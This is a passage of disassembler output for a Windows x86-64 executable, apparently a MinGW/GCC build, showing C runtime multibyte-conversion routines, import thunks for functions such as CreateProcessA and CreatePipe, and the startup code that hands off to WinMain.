   14000903e:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   140009045:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
   14000904a:	ff 15 d8 72 00 00    	call   *0x72d8(%rip)        # 140010328 <__imp_IsDBCSLeadByteEx>
   140009050:	85 c0                	test   %eax,%eax
   140009052:	74 54                	je     1400090a8 <__mbrtowc_cp+0xb8>
   140009054:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   140009059:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   14000905e:	49 83 f8 01          	cmp    $0x1,%r8
   140009062:	0f 84 c6 00 00 00    	je     14000912e <__mbrtowc_cp+0x13e>
   140009068:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000906d:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140009073:	49 89 d8             	mov    %rbx,%r8
   140009076:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000907d:	00 
   14000907e:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   140009085:	ba 08 00 00 00       	mov    $0x8,%edx
   14000908a:	ff 15 a8 72 00 00    	call   *0x72a8(%rip)        # 140010338 <__imp_MultiByteToWideChar>
   140009090:	85 c0                	test   %eax,%eax
   140009092:	0f 84 84 00 00 00    	je     14000911c <__mbrtowc_cp+0x12c>
   140009098:	b8 02 00 00 00       	mov    $0x2,%eax
   14000909d:	48 83 c4 48          	add    $0x48,%rsp
   1400090a1:	5b                   	pop    %rbx
   1400090a2:	5f                   	pop    %rdi
   1400090a3:	c3                   	ret
   1400090a4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400090a8:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400090af:	85 c0                	test   %eax,%eax
   1400090b1:	75 3d                	jne    1400090f0 <__mbrtowc_cp+0x100>
   1400090b3:	0f b6 03             	movzbl (%rbx),%eax
   1400090b6:	66 89 07             	mov    %ax,(%rdi)
   1400090b9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400090be:	eb 07                	jmp    1400090c7 <__mbrtowc_cp+0xd7>
   1400090c0:	31 d2                	xor    %edx,%edx
   1400090c2:	66 89 11             	mov    %dx,(%rcx)
   1400090c5:	31 c0                	xor    %eax,%eax
   1400090c7:	48 83 c4 48          	add    $0x48,%rsp
   1400090cb:	5b                   	pop    %rbx
   1400090cc:	5f                   	pop    %rdi
   1400090cd:	c3                   	ret
   1400090ce:	66 90                	xchg   %ax,%ax
   1400090d0:	88 54 24 3d          	mov    %dl,0x3d(%rsp)
   1400090d4:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400090da:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   1400090df:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400090e6:	00 
   1400090e7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400090ec:	eb 90                	jmp    14000907e <__mbrtowc_cp+0x8e>
   1400090ee:	66 90                	xchg   %ax,%ax
   1400090f0:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400090f7:	00 
   1400090f8:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   1400090ff:	49 89 d8             	mov    %rbx,%r8
   140009102:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009108:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000910d:	ba 08 00 00 00       	mov    $0x8,%edx
   140009112:	ff 15 20 72 00 00    	call   *0x7220(%rip)        # 140010338 <__imp_MultiByteToWideChar>
   140009118:	85 c0                	test   %eax,%eax
   14000911a:	75 9d                	jne    1400090b9 <__mbrtowc_cp+0xc9>
   14000911c:	e8 47 02 00 00       	call   140009368 <_errno>
   140009121:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009127:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000912c:	eb 99                	jmp    1400090c7 <__mbrtowc_cp+0xd7>
   14000912e:	0f b6 03             	movzbl (%rbx),%eax
   140009131:	41 88 01             	mov    %al,(%r9)
   140009134:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
   140009139:	eb 8c                	jmp    1400090c7 <__mbrtowc_cp+0xd7>
   14000913b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140009140 <mbrtowc>:
   140009140:	41 54                	push   %r12
   140009142:	55                   	push   %rbp
   140009143:	57                   	push   %rdi
   140009144:	56                   	push   %rsi
   140009145:	53                   	push   %rbx
   140009146:	48 83 ec 40          	sub    $0x40,%rsp
   14000914a:	31 c0                	xor    %eax,%eax
   14000914c:	48 89 cb             	mov    %rcx,%rbx
   14000914f:	48 85 c9             	test   %rcx,%rcx
   140009152:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   140009157:	48 8d 44 24 3e       	lea    0x3e(%rsp),%rax
   14000915c:	4c 89 ce             	mov    %r9,%rsi
   14000915f:	48 0f 44 d8          	cmove  %rax,%rbx
   140009163:	48 89 d7             	mov    %rdx,%rdi
   140009166:	4c 89 c5             	mov    %r8,%rbp
   140009169:	e8 c2 01 00 00       	call   140009330 <___mb_cur_max_func>
   14000916e:	41 89 c4             	mov    %eax,%r12d
   140009171:	e8 b2 01 00 00       	call   140009328 <___lc_codepage_func>
   140009176:	48 85 f6             	test   %rsi,%rsi
   140009179:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000917e:	49 89 e8             	mov    %rbp,%r8
   140009181:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140009185:	4c 8d 0d ec 69 00 00 	lea    0x69ec(%rip),%r9        # 14000fb78 <internal_mbstate.2>
   14000918c:	48 89 fa             	mov    %rdi,%rdx
   14000918f:	48 89 d9             	mov    %rbx,%rcx
   140009192:	4c 0f 45 ce          	cmovne %rsi,%r9
   140009196:	e8 55 fe ff ff       	call   140008ff0 <__mbrtowc_cp>
   14000919b:	48 98                	cltq
   14000919d:	48 83 c4 40          	add    $0x40,%rsp
   1400091a1:	5b                   	pop    %rbx
   1400091a2:	5e                   	pop    %rsi
   1400091a3:	5f                   	pop    %rdi
   1400091a4:	5d                   	pop    %rbp
   1400091a5:	41 5c                	pop    %r12
   1400091a7:	c3                   	ret
   1400091a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400091af:	00 

00000001400091b0 <mbsrtowcs>:
   1400091b0:	41 56                	push   %r14
   1400091b2:	41 55                	push   %r13
   1400091b4:	41 54                	push   %r12
   1400091b6:	55                   	push   %rbp
   1400091b7:	57                   	push   %rdi
   1400091b8:	56                   	push   %rsi
   1400091b9:	53                   	push   %rbx
   1400091ba:	48 83 ec 40          	sub    $0x40,%rsp
   1400091be:	48 8d 05 af 69 00 00 	lea    0x69af(%rip),%rax        # 14000fb74 <internal_mbstate.1>
   1400091c5:	4c 89 ce             	mov    %r9,%rsi
   1400091c8:	4d 85 c9             	test   %r9,%r9
   1400091cb:	49 89 ce             	mov    %rcx,%r14
   1400091ce:	48 89 d3             	mov    %rdx,%rbx
   1400091d1:	48 0f 44 f0          	cmove  %rax,%rsi
   1400091d5:	4c 89 c7             	mov    %r8,%rdi
   1400091d8:	e8 4b 01 00 00       	call   140009328 <___lc_codepage_func>
   1400091dd:	41 89 c4             	mov    %eax,%r12d
   1400091e0:	e8 4b 01 00 00       	call   140009330 <___mb_cur_max_func>
   1400091e5:	89 c5                	mov    %eax,%ebp
   1400091e7:	48 85 db             	test   %rbx,%rbx
   1400091ea:	0f 84 c0 00 00 00    	je     1400092b0 <mbsrtowcs+0x100>
   1400091f0:	48 8b 13             	mov    (%rbx),%rdx
   1400091f3:	48 85 d2             	test   %rdx,%rdx
   1400091f6:	0f 84 b4 00 00 00    	je     1400092b0 <mbsrtowcs+0x100>
   1400091fc:	4d 85 f6             	test   %r14,%r14
   1400091ff:	74 6f                	je     140009270 <mbsrtowcs+0xc0>
   140009201:	45 31 ed             	xor    %r13d,%r13d
   140009204:	48 85 ff             	test   %rdi,%rdi
   140009207:	75 1e                	jne    140009227 <mbsrtowcs+0x77>
   140009209:	eb 4a                	jmp    140009255 <mbsrtowcs+0xa5>
   14000920b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009210:	48 8b 13             	mov    (%rbx),%rdx
   140009213:	48 98                	cltq
   140009215:	49 83 c6 02          	add    $0x2,%r14
   140009219:	49 01 c5             	add    %rax,%r13
   14000921c:	48 01 c2             	add    %rax,%rdx
   14000921f:	48 89 13             	mov    %rdx,(%rbx)
   140009222:	49 39 fd             	cmp    %rdi,%r13
   140009225:	73 2e                	jae    140009255 <mbsrtowcs+0xa5>
   140009227:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   14000922b:	49 89 f8             	mov    %rdi,%r8
   14000922e:	49 89 f1             	mov    %rsi,%r9
   140009231:	4c 89 f1             	mov    %r14,%rcx
   140009234:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   140009239:	4d 29 e8             	sub    %r13,%r8
   14000923c:	e8 af fd ff ff       	call   140008ff0 <__mbrtowc_cp>
   140009241:	85 c0                	test   %eax,%eax
   140009243:	7f cb                	jg     140009210 <mbsrtowcs+0x60>
   140009245:	49 39 fd             	cmp    %rdi,%r13
   140009248:	73 0b                	jae    140009255 <mbsrtowcs+0xa5>
   14000924a:	85 c0                	test   %eax,%eax
   14000924c:	75 07                	jne    140009255 <mbsrtowcs+0xa5>
   14000924e:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140009255:	4c 89 e8             	mov    %r13,%rax
   140009258:	48 83 c4 40          	add    $0x40,%rsp
   14000925c:	5b                   	pop    %rbx
   14000925d:	5e                   	pop    %rsi
   14000925e:	5f                   	pop    %rdi
   14000925f:	5d                   	pop    %rbp
   140009260:	41 5c                	pop    %r12
   140009262:	41 5d                	pop    %r13
   140009264:	41 5e                	pop    %r14
   140009266:	c3                   	ret
   140009267:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000926e:	00 00 
   140009270:	31 c0                	xor    %eax,%eax
   140009272:	41 89 ee             	mov    %ebp,%r14d
   140009275:	48 8d 7c 24 3e       	lea    0x3e(%rsp),%rdi
   14000927a:	45 31 ed             	xor    %r13d,%r13d
   14000927d:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   140009282:	eb 0c                	jmp    140009290 <mbsrtowcs+0xe0>
   140009284:	0f 1f 40 00          	nopl   0x0(%rax)
   140009288:	48 98                	cltq
   14000928a:	48 8b 13             	mov    (%rbx),%rdx
   14000928d:	49 01 c5             	add    %rax,%r13
   140009290:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140009294:	4c 01 ea             	add    %r13,%rdx
   140009297:	49 89 f1             	mov    %rsi,%r9
   14000929a:	4d 89 f0             	mov    %r14,%r8
   14000929d:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   1400092a2:	48 89 f9             	mov    %rdi,%rcx
   1400092a5:	e8 46 fd ff ff       	call   140008ff0 <__mbrtowc_cp>
   1400092aa:	85 c0                	test   %eax,%eax
   1400092ac:	7f da                	jg     140009288 <mbsrtowcs+0xd8>
   1400092ae:	eb a5                	jmp    140009255 <mbsrtowcs+0xa5>
   1400092b0:	45 31 ed             	xor    %r13d,%r13d
   1400092b3:	eb a0                	jmp    140009255 <mbsrtowcs+0xa5>
   1400092b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400092bc:	00 00 00 00 

00000001400092c0 <mbrlen>:
   1400092c0:	55                   	push   %rbp
   1400092c1:	57                   	push   %rdi
   1400092c2:	56                   	push   %rsi
   1400092c3:	53                   	push   %rbx
   1400092c4:	48 83 ec 48          	sub    $0x48,%rsp
   1400092c8:	31 c0                	xor    %eax,%eax
   1400092ca:	48 89 ce             	mov    %rcx,%rsi
   1400092cd:	48 89 d7             	mov    %rdx,%rdi
   1400092d0:	4c 89 c3             	mov    %r8,%rbx
   1400092d3:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1400092d8:	e8 53 00 00 00       	call   140009330 <___mb_cur_max_func>
   1400092dd:	89 c5                	mov    %eax,%ebp
   1400092df:	e8 44 00 00 00       	call   140009328 <___lc_codepage_func>
   1400092e4:	48 85 db             	test   %rbx,%rbx
   1400092e7:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1400092eb:	49 89 f8             	mov    %rdi,%r8
   1400092ee:	48 8d 15 7b 68 00 00 	lea    0x687b(%rip),%rdx        # 14000fb70 <s_mbstate.0>
   1400092f5:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400092f9:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
   1400092fe:	48 0f 44 da          	cmove  %rdx,%rbx
   140009302:	48 89 f2             	mov    %rsi,%rdx
   140009305:	49 89 d9             	mov    %rbx,%r9
   140009308:	e8 e3 fc ff ff       	call   140008ff0 <__mbrtowc_cp>
   14000930d:	48 98                	cltq
   14000930f:	48 83 c4 48          	add    $0x48,%rsp
   140009313:	5b                   	pop    %rbx
   140009314:	5e                   	pop    %rsi
   140009315:	5f                   	pop    %rdi
   140009316:	5d                   	pop    %rbp
   140009317:	c3                   	ret
   140009318:	90                   	nop
   140009319:	90                   	nop
   14000931a:	90                   	nop
   14000931b:	90                   	nop
   14000931c:	90                   	nop
   14000931d:	90                   	nop
   14000931e:	90                   	nop
   14000931f:	90                   	nop

0000000140009320 <__C_specific_handler>:
   140009320:	ff 25 72 70 00 00    	jmp    *0x7072(%rip)        # 140010398 <__imp___C_specific_handler>
   140009326:	90                   	nop
   140009327:	90                   	nop

0000000140009328 <___lc_codepage_func>:
   140009328:	ff 25 72 70 00 00    	jmp    *0x7072(%rip)        # 1400103a0 <__imp____lc_codepage_func>
   14000932e:	90                   	nop
   14000932f:	90                   	nop

0000000140009330 <___mb_cur_max_func>:
   140009330:	ff 25 72 70 00 00    	jmp    *0x7072(%rip)        # 1400103a8 <__imp____mb_cur_max_func>
   140009336:	90                   	nop
   140009337:	90                   	nop

0000000140009338 <__getmainargs>:
   140009338:	ff 25 72 70 00 00    	jmp    *0x7072(%rip)        # 1400103b0 <__imp___getmainargs>
   14000933e:	90                   	nop
   14000933f:	90                   	nop

0000000140009340 <__iob_func>:
   140009340:	ff 25 7a 70 00 00    	jmp    *0x707a(%rip)        # 1400103c0 <__imp___iob_func>
   140009346:	90                   	nop
   140009347:	90                   	nop

0000000140009348 <__set_app_type>:
   140009348:	ff 25 7a 70 00 00    	jmp    *0x707a(%rip)        # 1400103c8 <__imp___set_app_type>
   14000934e:	90                   	nop
   14000934f:	90                   	nop

0000000140009350 <__setusermatherr>:
   140009350:	ff 25 7a 70 00 00    	jmp    *0x707a(%rip)        # 1400103d0 <__imp___setusermatherr>
   140009356:	90                   	nop
   140009357:	90                   	nop

0000000140009358 <_amsg_exit>:
   140009358:	ff 25 82 70 00 00    	jmp    *0x7082(%rip)        # 1400103e0 <__imp__amsg_exit>
   14000935e:	90                   	nop
   14000935f:	90                   	nop

0000000140009360 <_cexit>:
   140009360:	ff 25 82 70 00 00    	jmp    *0x7082(%rip)        # 1400103e8 <__imp__cexit>
   140009366:	90                   	nop
   140009367:	90                   	nop

0000000140009368 <_errno>:
   140009368:	ff 25 8a 70 00 00    	jmp    *0x708a(%rip)        # 1400103f8 <__imp__errno>
   14000936e:	90                   	nop
   14000936f:	90                   	nop

0000000140009370 <getpid>:
   140009370:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010408 <__imp_getpid>
   140009376:	90                   	nop
   140009377:	90                   	nop

0000000140009378 <_initterm>:
   140009378:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010410 <__imp__initterm>
   14000937e:	90                   	nop
   14000937f:	90                   	nop

0000000140009380 <_ismbblead>:
   140009380:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010418 <__imp__ismbblead>
   140009386:	90                   	nop
   140009387:	90                   	nop

0000000140009388 <_onexit>:
   140009388:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010420 <__imp__onexit>
   14000938e:	90                   	nop
   14000938f:	90                   	nop

0000000140009390 <abort>:
   140009390:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010428 <__imp_abort>
   140009396:	90                   	nop
   140009397:	90                   	nop

0000000140009398 <calloc>:
   140009398:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010430 <__imp_calloc>
   14000939e:	90                   	nop
   14000939f:	90                   	nop

00000001400093a0 <exit>:
   1400093a0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010438 <__imp_exit>
   1400093a6:	90                   	nop
   1400093a7:	90                   	nop

00000001400093a8 <fprintf>:
   1400093a8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010440 <__imp_fprintf>
   1400093ae:	90                   	nop
   1400093af:	90                   	nop

00000001400093b0 <fputc>:
   1400093b0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010448 <__imp_fputc>
   1400093b6:	90                   	nop
   1400093b7:	90                   	nop

00000001400093b8 <free>:
   1400093b8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010450 <__imp_free>
   1400093be:	90                   	nop
   1400093bf:	90                   	nop

00000001400093c0 <fwrite>:
   1400093c0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010458 <__imp_fwrite>
   1400093c6:	90                   	nop
   1400093c7:	90                   	nop

00000001400093c8 <localeconv>:
   1400093c8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010460 <__imp_localeconv>
   1400093ce:	90                   	nop
   1400093cf:	90                   	nop

00000001400093d0 <malloc>:
   1400093d0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010468 <__imp_malloc>
   1400093d6:	90                   	nop
   1400093d7:	90                   	nop

00000001400093d8 <memcpy>:
   1400093d8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010470 <__imp_memcpy>
   1400093de:	90                   	nop
   1400093df:	90                   	nop

00000001400093e0 <memmove>:
   1400093e0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010478 <__imp_memmove>
   1400093e6:	90                   	nop
   1400093e7:	90                   	nop

00000001400093e8 <memset>:
   1400093e8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010480 <__imp_memset>
   1400093ee:	90                   	nop
   1400093ef:	90                   	nop

00000001400093f0 <signal>:
   1400093f0:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010488 <__imp_signal>
   1400093f6:	90                   	nop
   1400093f7:	90                   	nop

00000001400093f8 <strerror>:
   1400093f8:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010490 <__imp_strerror>
   1400093fe:	90                   	nop
   1400093ff:	90                   	nop

0000000140009400 <strlen>:
   140009400:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 140010498 <__imp_strlen>
   140009406:	90                   	nop
   140009407:	90                   	nop

0000000140009408 <strncmp>:
   140009408:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 1400104a0 <__imp_strncmp>
   14000940e:	90                   	nop
   14000940f:	90                   	nop

0000000140009410 <vfprintf>:
   140009410:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 1400104a8 <__imp_vfprintf>
   140009416:	90                   	nop
   140009417:	90                   	nop

0000000140009418 <wcslen>:
   140009418:	ff 25 92 70 00 00    	jmp    *0x7092(%rip)        # 1400104b0 <__imp_wcslen>
   14000941e:	90                   	nop
   14000941f:	90                   	nop

0000000140009420 <WriteFile>:
   140009420:	ff 25 62 6f 00 00    	jmp    *0x6f62(%rip)        # 140010388 <__imp_WriteFile>
   140009426:	90                   	nop
   140009427:	90                   	nop

0000000140009428 <WideCharToMultiByte>:
   140009428:	ff 25 52 6f 00 00    	jmp    *0x6f52(%rip)        # 140010380 <__imp_WideCharToMultiByte>
   14000942e:	90                   	nop
   14000942f:	90                   	nop

0000000140009430 <WaitForSingleObject>:
   140009430:	ff 25 42 6f 00 00    	jmp    *0x6f42(%rip)        # 140010378 <__imp_WaitForSingleObject>
   140009436:	90                   	nop
   140009437:	90                   	nop

0000000140009438 <VirtualQuery>:
   140009438:	ff 25 32 6f 00 00    	jmp    *0x6f32(%rip)        # 140010370 <__imp_VirtualQuery>
   14000943e:	90                   	nop
   14000943f:	90                   	nop

0000000140009440 <VirtualProtect>:
   140009440:	ff 25 22 6f 00 00    	jmp    *0x6f22(%rip)        # 140010368 <__imp_VirtualProtect>
   140009446:	90                   	nop
   140009447:	90                   	nop

0000000140009448 <TlsGetValue>:
   140009448:	ff 25 12 6f 00 00    	jmp    *0x6f12(%rip)        # 140010360 <__imp_TlsGetValue>
   14000944e:	90                   	nop
   14000944f:	90                   	nop

0000000140009450 <Sleep>:
   140009450:	ff 25 02 6f 00 00    	jmp    *0x6f02(%rip)        # 140010358 <__imp_Sleep>
   140009456:	90                   	nop
   140009457:	90                   	nop

0000000140009458 <SetUnhandledExceptionFilter>:
   140009458:	ff 25 f2 6e 00 00    	jmp    *0x6ef2(%rip)        # 140010350 <__imp_SetUnhandledExceptionFilter>
   14000945e:	90                   	nop
   14000945f:	90                   	nop

0000000140009460 <SetHandleInformation>:
   140009460:	ff 25 e2 6e 00 00    	jmp    *0x6ee2(%rip)        # 140010348 <__imp_SetHandleInformation>
   140009466:	90                   	nop
   140009467:	90                   	nop

0000000140009468 <ReadFile>:
   140009468:	ff 25 d2 6e 00 00    	jmp    *0x6ed2(%rip)        # 140010340 <__imp_ReadFile>
   14000946e:	90                   	nop
   14000946f:	90                   	nop

0000000140009470 <MultiByteToWideChar>:
   140009470:	ff 25 c2 6e 00 00    	jmp    *0x6ec2(%rip)        # 140010338 <__imp_MultiByteToWideChar>
   140009476:	90                   	nop
   140009477:	90                   	nop

0000000140009478 <LeaveCriticalSection>:
   140009478:	ff 25 b2 6e 00 00    	jmp    *0x6eb2(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   14000947e:	90                   	nop
   14000947f:	90                   	nop

0000000140009480 <IsDBCSLeadByteEx>:
   140009480:	ff 25 a2 6e 00 00    	jmp    *0x6ea2(%rip)        # 140010328 <__imp_IsDBCSLeadByteEx>
   140009486:	90                   	nop
   140009487:	90                   	nop

0000000140009488 <InitializeCriticalSection>:
   140009488:	ff 25 92 6e 00 00    	jmp    *0x6e92(%rip)        # 140010320 <__imp_InitializeCriticalSection>
   14000948e:	90                   	nop
   14000948f:	90                   	nop

0000000140009490 <GetStartupInfoA>:
   140009490:	ff 25 82 6e 00 00    	jmp    *0x6e82(%rip)        # 140010318 <__imp_GetStartupInfoA>
   140009496:	90                   	nop
   140009497:	90                   	nop

0000000140009498 <GetLastError>:
   140009498:	ff 25 72 6e 00 00    	jmp    *0x6e72(%rip)        # 140010310 <__imp_GetLastError>
   14000949e:	90                   	nop
   14000949f:	90                   	nop

00000001400094a0 <GetExitCodeProcess>:
   1400094a0:	ff 25 62 6e 00 00    	jmp    *0x6e62(%rip)        # 140010308 <__imp_GetExitCodeProcess>
   1400094a6:	90                   	nop
   1400094a7:	90                   	nop

00000001400094a8 <EnterCriticalSection>:
   1400094a8:	ff 25 52 6e 00 00    	jmp    *0x6e52(%rip)        # 140010300 <__imp_EnterCriticalSection>
   1400094ae:	90                   	nop
   1400094af:	90                   	nop

00000001400094b0 <DeleteCriticalSection>:
   1400094b0:	ff 25 42 6e 00 00    	jmp    *0x6e42(%rip)        # 1400102f8 <__imp_DeleteCriticalSection>
   1400094b6:	90                   	nop
   1400094b7:	90                   	nop

00000001400094b8 <CreateProcessA>:
   1400094b8:	ff 25 32 6e 00 00    	jmp    *0x6e32(%rip)        # 1400102f0 <__imp_CreateProcessA>
   1400094be:	90                   	nop
   1400094bf:	90                   	nop

00000001400094c0 <CreatePipe>:
   1400094c0:	ff 25 22 6e 00 00    	jmp    *0x6e22(%rip)        # 1400102e8 <__imp_CreatePipe>
   1400094c6:	90                   	nop
   1400094c7:	90                   	nop

00000001400094c8 <CloseHandle>:
   1400094c8:	ff 25 12 6e 00 00    	jmp    *0x6e12(%rip)        # 1400102e0 <__IAT_start__>
   1400094ce:	90                   	nop
   1400094cf:	90                   	nop

00000001400094d0 <main>:
   1400094d0:	57                   	push   %rdi
   1400094d1:	56                   	push   %rsi
   1400094d2:	53                   	push   %rbx
   1400094d3:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400094da:	31 f6                	xor    %esi,%esi
   1400094dc:	e8 2f 95 ff ff       	call   140002a10 <__main>
   1400094e1:	e8 ea f8 ff ff       	call   140008dd0 <__p__acmdln>
   1400094e6:	48 8b 18             	mov    (%rax),%rbx
   1400094e9:	48 85 db             	test   %rbx,%rbx
   1400094ec:	75 2d                	jne    14000951b <main+0x4b>
   1400094ee:	e9 9e 00 00 00       	jmp    140009591 <main+0xc1>
   1400094f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400094f8:	84 c9                	test   %cl,%cl
   1400094fa:	74 4c                	je     140009548 <main+0x78>
   1400094fc:	83 e6 01             	and    $0x1,%esi
   1400094ff:	74 2f                	je     140009530 <main+0x60>
   140009501:	be 01 00 00 00       	mov    $0x1,%esi
   140009506:	e8 75 fe ff ff       	call   140009380 <_ismbblead>
   14000950b:	85 c0                	test   %eax,%eax
   14000950d:	74 08                	je     140009517 <main+0x47>
   14000950f:	80 7b 01 01          	cmpb   $0x1,0x1(%rbx)
   140009513:	48 83 db ff          	sbb    $0xffffffffffffffff,%rbx
   140009517:	48 83 c3 01          	add    $0x1,%rbx
   14000951b:	0f be 0b             	movsbl (%rbx),%ecx
   14000951e:	80 f9 20             	cmp    $0x20,%cl
   140009521:	7e d5                	jle    1400094f8 <main+0x28>
   140009523:	89 f0                	mov    %esi,%eax
   140009525:	83 f0 01             	xor    $0x1,%eax
   140009528:	80 f9 22             	cmp    $0x22,%cl
   14000952b:	0f 44 f0             	cmove  %eax,%esi
   14000952e:	eb d6                	jmp    140009506 <main+0x36>
   140009530:	84 c9                	test   %cl,%cl
   140009532:	74 14                	je     140009548 <main+0x78>
   140009534:	0f 1f 40 00          	nopl   0x0(%rax)
   140009538:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   14000953c:	48 83 c3 01          	add    $0x1,%rbx
   140009540:	84 c0                	test   %al,%al
   140009542:	74 04                	je     140009548 <main+0x78>
   140009544:	3c 20                	cmp    $0x20,%al
   140009546:	7e f0                	jle    140009538 <main+0x68>
   140009548:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000954d:	31 c0                	xor    %eax,%eax
   14000954f:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140009554:	48 89 d7             	mov    %rdx,%rdi
   140009557:	f3 48 ab             	rep stos %rax,%es:(%rdi)
   14000955a:	48 89 d1             	mov    %rdx,%rcx
   14000955d:	ff 15 b5 6d 00 00    	call   *0x6db5(%rip)        # 140010318 <__imp_GetStartupInfoA>
   140009563:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   140009569:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000956e:	74 06                	je     140009576 <main+0xa6>
   140009570:	44 0f b7 4c 24 60    	movzwl 0x60(%rsp),%r9d
   140009576:	48 8b 0d f3 23 00 00 	mov    0x23f3(%rip),%rcx        # 14000b970 <.refptr.__ImageBase>
   14000957d:	49 89 d8             	mov    %rbx,%r8
   140009580:	31 d2                	xor    %edx,%edx
   140009582:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140009589:	5b                   	pop    %rbx
   14000958a:	5e                   	pop    %rsi
   14000958b:	5f                   	pop    %rdi
   14000958c:	e9 2f 93 ff ff       	jmp    1400028c0 <WinMain>
   140009591:	48 8d 1d c8 1c 00 00 	lea    0x1cc8(%rip),%rbx        # 14000b260 <.rdata>
   140009598:	eb ae                	jmp    140009548 <main+0x78>
   14000959a:	90                   	nop
   14000959b:	90                   	nop
   14000959c:	90                   	nop
   14000959d:	90                   	nop
   14000959e:	90                   	nop
   14000959f:	90                   	nop

00000001400095a0 <register_frame_ctor>:
   1400095a0:	e9 8b 7e ff ff       	jmp    140001430 <__gcc_register_frame>
   1400095a5:	90                   	nop
   1400095a6:	90                   	nop
   1400095a7:	90                   	nop
   1400095a8:	90                   	nop
   1400095a9:	90                   	nop
   1400095aa:	90                   	nop
   1400095ab:	90                   	nop
   1400095ac:	90                   	nop
   1400095ad:	90                   	nop
   1400095ae:	90                   	nop
   1400095af:	90                   	nop

00000001400095b0 <__CTOR_LIST__>:
   1400095b0:	ff                   	(bad)
   1400095b1:	ff                   	(bad)
   1400095b2:	ff                   	(bad)
   1400095b3:	ff                   	(bad)
   1400095b4:	ff                   	(bad)
   1400095b5:	ff                   	(bad)
   1400095b6:	ff                   	(bad)
   1400095b7:	ff                   	.byte 0xff

00000001400095b8 <.ctors.65535>:
   1400095b8:	a0 95 00 40 01 00 00 	movabs 0x1400095,%al
   1400095bf:	00 00 
   1400095c1:	00 00                	add    %al,(%rax)
   1400095c3:	00 00                	add    %al,(%rax)
   1400095c5:	00 00                	add    %al,(%rax)
	...

00000001400095c8 <__DTOR_LIST__>:
   1400095c8:	ff                   	(bad)
   1400095c9:	ff                   	(bad)
   1400095ca:	ff                   	(bad)
   1400095cb:	ff                   	(bad)
   1400095cc:	ff                   	(bad)
   1400095cd:	ff                   	(bad)
   1400095ce:	ff                   	(bad)
   1400095cf:	ff 00                	incl   (%rax)
   1400095d1:	00 00                	add    %al,(%rax)
   1400095d3:	00 00                	add    %al,(%rax)
   1400095d5:	00 00                	add    %al,(%rax)
	...
